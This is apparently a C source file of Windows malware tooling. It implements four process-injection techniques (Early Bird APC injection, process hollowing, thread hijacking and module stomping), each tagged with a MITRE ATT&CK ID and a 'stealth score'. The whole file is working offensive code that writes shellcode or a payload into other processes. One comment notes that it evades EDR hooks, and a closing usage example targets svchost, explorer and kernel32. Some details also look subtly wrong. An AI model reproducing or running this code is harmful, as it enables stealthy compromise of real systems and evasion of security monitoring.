/*
 * Remote Process Injection - Multiple Techniques
 * Based on 2026 research: EarlyBird APC, PhantomInjector, PhantomShell
 * 
 * Techniques:
 * 1. Early Bird APC Injection
 * 2. Process Hollowing
 * 3. Thread Hijacking
 * 4. Module Stomping
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>

// ============================================================================
// 1. Early Bird APC Injection
// ============================================================================

/*
 * Early Bird APC Injection
 * 
 * Creates process in suspended state, injects before EDR hooks load
 * MITRE ATT&CK: T1055.004
 * Stealth Score: 70/100
 */
int early_bird_apc_injection(const char* target_path, uint8_t* shellcode, size_t shellcode_size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create process in suspended state
    if (!CreateProcessA(
        target_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return 0;
    }
    
    // Allocate memory in target process
    LPVOID remote_mem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remote_mem) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    
    // Write shellcode
    if (!WriteProcessMemory(pi.hProcess, remote_mem, shellcode, shellcode_size, NULL)) {
        VirtualFreeEx(pi.hProcess, remote_mem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    
    // Queue APC to suspended thread
    if (!QueueUserAPC((PAPCFUNC)remote_mem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, remote_mem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    
    // Resume thread - APC will execute immediately
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 1;
}

// ============================================================================
// 2. Process Hollowing
// ============================================================================

/*
 * Process Hollowing
 * 
 * Unmaps legitimate image and replaces with malicious payload
 * MITRE ATT&CK: T1055.012
 * Stealth Score: 60/100
 */
int process_hollowing(const char* target_path, uint8_t* payload, size_t payload_size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcessA(
        target_path,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        return 0;
    }
    
    // Get target image base address
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
#ifdef _WIN64
    LPVOID image_base = (LPVOID)ctx.Rdx;  // PEB address in RDX
#else
    LPVOID image_base = (LPVOID)ctx.Ebx;  // PEB address in EBX
#endif
    
    // Read PEB to get image base
    LPVOID peb_image_base;
    ReadProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)image_base + 0x10), &peb_image_base, sizeof(LPVOID), NULL);
    
    // Unmap original image
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    
    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, peb_image_base);
    }
    
    // Parse PE headers
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)payload;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(payload + dos->e_lfanew);
    
    // Allocate memory for new image
    LPVOID new_base = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!new_base) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
    
    // Write headers
    WriteProcessMemory(pi.hProcess, new_base, payload, nt->OptionalHeader.SizeOfHeaders, NULL);
    
    // Write sections
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(
            pi.hProcess,
            (LPVOID)((DWORD_PTR)new_base + section[i].VirtualAddress),
            payload + section[i].PointerToRawData,
            section[i].SizeOfRawData,
            NULL
        );
    }
    
    // Update entry point
#ifdef _WIN64
    ctx.Rcx = (DWORD64)((DWORD_PTR)new_base + nt->OptionalHeader.AddressOfEntryPoint);
#else
    ctx.Eax = (DWORD)((DWORD_PTR)new_base + nt->OptionalHeader.AddressOfEntryPoint);
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 1;
}

// ============================================================================
// 3. Thread Hijacking
// ============================================================================

/*
 * Thread Hijacking
 * 
 * Redirects existing thread's RIP/EIP to shellcode
 * MITRE ATT&CK: T1055.003
 * Stealth Score: 75/100
 */
int thread_hijacking(DWORD target_pid, uint8_t* shellcode, size_t shellcode_size) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return 0;
    
    // Allocate memory
    LPVOID remote_mem = VirtualAllocEx(
        hProcess,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!remote_mem) {
        CloseHandle(hProcess);
        return 0;
    }
    
    // Write shellcode
    WriteProcessMemory(hProcess, remote_mem, shellcode, shellcode_size, NULL);
    
    // Find a thread to hijack
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    
    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    
    HANDLE hThread = NULL;
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == target_pid) {
                hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    
    CloseHandle(hSnapshot);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }
    
    // Suspend thread
    SuspendThread(hThread);
    
    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    // Save original RIP/EIP (for restoration)
#ifdef _WIN64
    DWORD64 original_rip = ctx.Rip;
    ctx.Rip = (DWORD64)remote_mem;
#else
    DWORD original_eip = ctx.Eip;
    ctx.Eip = (DWORD)remote_mem;
#endif
    
    // Set new context
    SetThreadContext(hThread, &ctx);
    
    // Resume thread
    ResumeThread(hThread);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 1;
}

// ============================================================================
// 4. Module Stomping
// ============================================================================

/*
 * Module Stomping
 * 
 * Overwrites unused DLL sections with shellcode
 * MITRE ATT&CK: T1055.001 (variant)
 * Stealth Score: 75/100
 */
int module_stomping(DWORD target_pid, const char* target_module, uint8_t* shellcode, size_t shellcode_size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return 0;
    
    // Enumerate modules in target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, target_pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return 0;
    }
    
    MODULEENTRY32 me;
    me.dwSize = sizeof(me);
    
    LPVOID module_base = NULL;
    DWORD module_size = 0;
    
    if (Module32First(hSnapshot, &me)) {
        do {
            if (_stricmp(me.szModule, target_module) == 0) {
                module_base = me.modBaseAddr;
                module_size = me.modBaseSize;
                break;
            }
        } while (Module32Next(hSnapshot, &me));
    }
    
    CloseHandle(hSnapshot);
    
    if (!module_base) {
        CloseHandle(hProcess);
        return 0;
    }
    
    // Calculate tail-of-image address
    LPVOID stomp_addr = (LPVOID)((DWORD_PTR)module_base + module_size - shellcode_size);
    
    // Change protection
    DWORD old_protect;
    VirtualProtectEx(hProcess, stomp_addr, shellcode_size, PAGE_EXECUTE_READWRITE, &old_protect);
    
    // Write shellcode
    WriteProcessMemory(hProcess, stomp_addr, shellcode, shellcode_size, NULL);
    
    // Restore protection
    VirtualProtectEx(hProcess, stomp_addr, shellcode_size, old_protect, &old_protect);
    
    // Create remote thread at stomped location
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)stomp_addr, NULL, 0, NULL);
    
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProcess);
    
    return hThread != NULL;
}

/*
 * Usage Example:
 * 
 * // Early Bird APC
 * early_bird_apc_injection("C:\\Windows\\System32\\notepad.exe", shellcode, size);
 * 
 * // Process Hollowing
 * process_hollowing("C:\\Windows\\System32\\svchost.exe", payload_pe, size);
 * 
 * // Thread Hijacking
 * DWORD pid = find_process_by_name("explorer.exe");
 * thread_hijacking(pid, shellcode, size);
 * 
 * // Module Stomping
 * module_stomping(pid, "kernel32.dll", shellcode, size);
 */
